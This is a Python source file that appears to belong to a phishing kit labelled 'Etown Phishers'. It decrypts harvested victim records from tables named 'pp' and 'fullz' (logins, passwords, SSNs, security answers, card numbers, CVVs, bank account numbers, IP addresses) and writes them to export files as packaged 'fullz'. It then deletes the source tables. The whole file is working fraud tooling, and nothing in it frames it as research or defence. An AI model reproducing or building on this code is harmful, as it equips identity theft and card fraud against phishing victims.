from mycrypt import encrypt, decrypt
from mydatabase import conn, query_conn

# Export module
# pp | fullz | dead_fullz

class ExportModule:
	# init
	def __init__(self, filename="", export_type="", delete_table=True):
		try:
			self.filename = filename
			self.export_type = export_type.lower()
			self.delete_table = delete_table
		except Exception as e:
			print('ExportModule init has any errors.')
			print(e)

	# set filename & export_type
	def set_file_type(self, filename, export_type):
		self.filename = filename
		self.export_type = export_type.lower()

	# set file content
	def set_file_content(self, write_data):
		try:
			with open(self.filename, "w") as write_file:
				write_file.write(write_data)
		except Exception as e:
			print('ExportModule file opening has any errors.')
			print(e)

	# export pp
	def export_pp(self, table_name = 'pp'):
		try:
			result_text = ""
			sample_text = "+ ----------- Login Information ------------+\n+ ------------------------------------------+\n| id: %s\n%s%s+ ------------------------------------------+\n%s%s%s%s%s+ ------------------------------------------+\n\n"
			query = "select email, password, ip_address, location, user_agent, browser, platform, id from `%s` where 1" % table_name
			query_conn.execute(query)
			f_list = query_conn.fetchall()
			for f in f_list:
				result_text += sample_text % (f[7], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]))

			self.set_file_content(result_text)

			if self.delete_table == True:
				query_conn.execute("delete from `%s`" % table_name)
				conn.commit()
		except Exception as e:
			print('ExportModule export %s method has any errors.' % table_name)
			print(e)

	# export fullz
	def export_fullz(self, table_name = 'fullz'):
		try:
			result_text = ""
			sample_text = "+ ------------- Etown Phishers -------------+\n+ ------------------------------------------+\n+ Personal Information\n| id: %s\n%s%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Billing Information\n%s%s%s%s%s%s%s%s+ ------------------------------------------+\n+ Account Information\n%s%s+ ------------------------------------------+\n+ Victim Information\n%s%s%s%s%s+ ------------------------------------------+\n\n"
			query = "select full_name, birth_date, address, zip, country, phone, ssn, secu_question, secu_answer, card_bin, card_bank, card_type, card_number, expire_date, cvv, account_number, sortcode, user_name, password, ip_address, location, user_agent, browser, platform, id from `%s` where 1" % table_name
			query_conn.execute(query)
			f_list = query_conn.fetchall()
			for f in f_list:
				result_text += sample_text % (f[24], decrypt(f[0]), decrypt(f[1]), decrypt(f[2]), decrypt(f[3]), decrypt(f[4]), decrypt(f[5]), decrypt(f[6]), decrypt(f[7]), decrypt(f[8]), decrypt(f[9]), decrypt(f[10]), decrypt(f[11]), decrypt(f[12]), decrypt(f[13]), decrypt(f[14]), decrypt(f[15]), decrypt(f[16]), decrypt(f[17]), decrypt(f[18]), decrypt(f[19]), decrypt(f[20]), decrypt(f[21]), decrypt(f[22]), decrypt(f[23]))

			self.set_file_content(result_text)

			if self.delete_table == True:
				query_conn.execute("delete from `%s`" % table_name)
				conn.commit()
		except Exception as e:
			print('ExportModule export %s method has any errors.' % table_name)
			print(e)

	# export dead_fullz
	def export_dead_fullz(self):
		self.export_fullz('dead_fullz')

	# export data via export_type
	def export_data(self):
		try:
			if self.export_type == 'pp':
				self.export_pp()
			if self.export_type == 'fullz':
				self.export_fullz()
			if self.export_type == 'dead_fullz':
				self.export_dead_fullz()
		except Exception as e:
			print('ExportModule export data has any errors.')
			print(e)


# define main
def main():
	print('--- my export main is running. ---')
	
	# Export module
	export_module = ExportModule()

	# PP export
	export_module.set_file_type('pp_available.txt', 'PP')
	export_module.export_data()

	# Fullz export
	export_module.set_file_type('fullz_available.txt', 'Fullz')
	export_module.export_data()

	# dead_fullz export
	# export_module.set_file_type('dead_fullz_available.txt', 'dead_fullz')
	# export_module.export_data()

# call main
if __name__ == "__main__":
    main()